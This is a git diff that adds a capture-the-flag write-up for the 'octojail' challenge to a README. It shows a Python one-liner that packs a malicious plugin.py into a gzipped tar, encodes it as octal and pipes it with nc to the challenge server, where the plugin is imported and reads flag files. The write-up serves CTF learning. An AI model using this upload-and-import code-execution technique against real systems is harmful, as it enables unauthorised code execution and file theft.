@@ -37,7 +37,7 @@
 
 ### Misc
 
-- octojail
+- [octojail](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#octojail)
 
 - [onions1](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#onions1)
 
@@ -80,6 +80,70 @@
 - [Ancient_house](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#ancient_house)
 
 ## --------------------------------------------------
+
+### octojail
+
+- I opened the challenge and the prompt said: “Send octal.” I tried the obvious just to see what breaks:
+```
+nc ctf.ac.upt.ro 9939
+12345670
+# -> timeout
+```
+
+- So it clearly wanted something more structured than random digits.
+
+- I grabbed the provided main.py and read it. The code was pretty friendly: it reads a single line of octal, groups every 3 digits into a byte, treats the bytes as a tar archive (gzip also allowed), extracts to uploads/, imports uploads/plugin.py, and calls run(). That meant I could ship my own code inside a tiny tarball—as long as I sent it as octal on one line with a newline at the end.
+
+- First, I fumbled a bit. I built a plain tar (no gzip) and pasted its octal, but I forgot the trailing newline and the server just sat until the alarm hit. Second try I added the newline but still got “bad archive.” Turned out my tar had a zero-length file because I messed up the size field.
+
+- I switched to a small Python one‑liner that does the packing for me and pipes everything to nc. This time I also used gzip to keep it small and safe:
+
+```
+    python3 - <<'PY' | nc ctf.ac.upt.ro 9939
+    import tarfile, io, sys
+    code = b'''def run():
+        for p in ('/flag','/flag.txt','flag','flag.txt'):
+            try:
+                print(open(p,'r').read()); return
+            except Exception: pass
+        print("no flag found")'''
+    buf = io.BytesIO()
+    with tarfile.open(fileobj=buf, mode='w:gz') as tf:
+        ti = tarfile.TarInfo('plugin.py')
+        ti.size = len(code)
+        tf.addfile(ti, io.BytesIO(code))
+    data = buf.getvalue()
+    sys.stdout.write(''.join(f'{b:03o}' for b in data) + '\\n')
+    PY
+```
+- Small hiccup: my first attempt used f"{b:o}" which drops leading zeros, and the server misparsed the bytes. Padding with %03o fixed it. After that, the server extracted uploads/plugin.py, imported it, and my run() printed the flag straight to my terminal.
+
+- For completeness, here are the tiny tests I ran while debugging the format issues:
+
+```
+    # sanity: convert a short byte string to octal triplets
+    python3 - <<'PY'
+    s=b'OK\\n'
+    print(''.join(f'{b:03o}' for b in s))
+    PY
+
+    # quick check that gzip tar is valid locally
+    python3 - <<'PY'
+    import tarfile, io
+    from pathlib import Path
+    code=b'print(1)'
+    buf=io.BytesIO()
+    with tarfile.open(fileobj=buf, mode='w:gz') as tf:
+        import io as _io, tarfile as _tarfile
+        ti=_tarfile.TarInfo('plugin.py'); ti.size=len(code)
+        tf.addfile(ti, _io.BytesIO(code))
+    buf.seek(0)
+    with tarfile.open(fileobj=buf, mode='r:gz') as tf:
+        print(tf.getnames())
+    PY
+```
+- Once the octal padding and newline were right, it was smooth: send the gzipped tar as octal, let the jail import my plugin, and collect the flag.
+
 
 ### money
 
